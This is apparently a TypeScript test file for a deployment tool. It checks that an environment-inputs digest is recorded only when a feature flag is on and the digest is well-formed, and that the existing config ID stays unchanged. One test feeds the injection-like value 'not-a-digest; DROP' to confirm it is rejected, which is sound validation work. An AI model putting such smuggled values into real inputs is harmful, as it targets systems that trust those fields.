// ------------------------------------------------- the recorded field

const PROJECT = { repo: "owner/repo", url: "https://git.example.com/owner/repo", testCommand: "pnpm test", autoMerge: false, autoDeploy: false } as never;

function captureRuntime(): { runtime: ShipRuntime; inputs: Array<Record<string, unknown>> } {
  const inputs: Array<Record<string, unknown>> = [];
  const runtime = {
    kind: "file",
    evidence: { forRepo: async () => ({ repo: "owner/repo", testCommand: "pnpm test" }) },
    projects: { list: async () => [PROJECT], forRepo: async () => PROJECT },
    policies: { list: async () => [] },
    governance: { get: async () => ({ authority: {}, windows: {}, reviewers: [] }) },
    store: { append: async (_id: string, e: { type: string; data?: { input?: Record<string, unknown> } }) => { if (e.type === "run-started") inputs.push(e.data!.input!); } },
    saveMeta: async () => {},
  } as unknown as ShipRuntime;
  return { runtime, inputs };
}
async function withFlag<T>(value: string | undefined, fn: () => Promise<T>): Promise<T> {
  const saved = process.env.SHIP_STACK_DETECT;
  if (value === undefined) delete process.env.SHIP_STACK_DETECT; else process.env.SHIP_STACK_DETECT = value;
  try { return await fn(); } finally { if (saved === undefined) delete process.env.SHIP_STACK_DETECT; else process.env.SHIP_STACK_DETECT = saved; }
}
const DIGEST = "ab".repeat(32);
const enqueueOpts = (runId: string, extra: object = {}) => ({ runId, task: "Verify project environment: x", model: "m", repo: "https://git.example.com/owner/repo", mode: "scan" as const, environmentCheck: true, environmentCheckOnly: true, ...extra });

test("flag off: the recorded input is byte-identical whether or not a digest is supplied", async () => {
  await withFlag(undefined, async () => {
    const a = captureRuntime();
    const b = captureRuntime();
    await enqueueRun(a.runtime, enqueueOpts("run-a"));
    await enqueueRun(b.runtime, enqueueOpts("run-a", { environmentInputsDigest: DIGEST }));
    assert.equal(JSON.stringify(b.inputs[0]), JSON.stringify(a.inputs[0]));
    assert.ok(!Object.hasOwn(b.inputs[0]!, "environmentInputsDigest"));
    assert.equal(a.inputs[0]!.environmentConfigId, projectReadinessKey(PROJECT));
  });
});

test("flag on: the digest is recorded next to environmentConfigId, which is unchanged", async () => {
  await withFlag("on", async () => {
    const off = captureRuntime();
    const on = captureRuntime();
    await withFlag(undefined, () => enqueueRun(off.runtime, enqueueOpts("run-b")));
    await enqueueRun(on.runtime, enqueueOpts("run-b", { environmentInputsDigest: DIGEST }));
    assert.equal(on.inputs[0]!.environmentInputsDigest, DIGEST);
    assert.equal(on.inputs[0]!.environmentConfigId, off.inputs[0]!.environmentConfigId);
    const { environmentInputsDigest: _drop, ...rest } = on.inputs[0]!;
    assert.deepEqual(rest, off.inputs[0], "additive only: removing the new field gives the old input");
  });
});

test("flag on: a malformed digest is not recorded, and a non-check run never records one", async () => {
  await withFlag("on", async () => {
    const c = captureRuntime();
    await enqueueRun(c.runtime, enqueueOpts("run-c", { environmentInputsDigest: "not-a-digest; DROP" }));
    await enqueueRun(c.runtime, { runId: "run-d", task: "t", model: "m", repo: "https://git.example.com/owner/repo", mode: "scan", environmentInputsDigest: DIGEST });
    assert.ok(!Object.hasOwn(c.inputs[0]!, "environmentInputsDigest"));
    assert.ok(!Object.hasOwn(c.inputs[1]!, "environmentInputsDigest"));
  });
});

test("projectReadinessRecord: key unchanged, digest only when enabled and well-formed", () => {
  assert.deepEqual(projectReadinessRecord(PROJECT, DIGEST, false), { environmentConfigId: projectReadinessKey(PROJECT) });
  assert.deepEqual(projectReadinessRecord(PROJECT, DIGEST, true), { environmentConfigId: projectReadinessKey(PROJECT), environmentInputsDigest: DIGEST });
  assert.deepEqual(projectReadinessRecord(null, undefined, true), {});
});
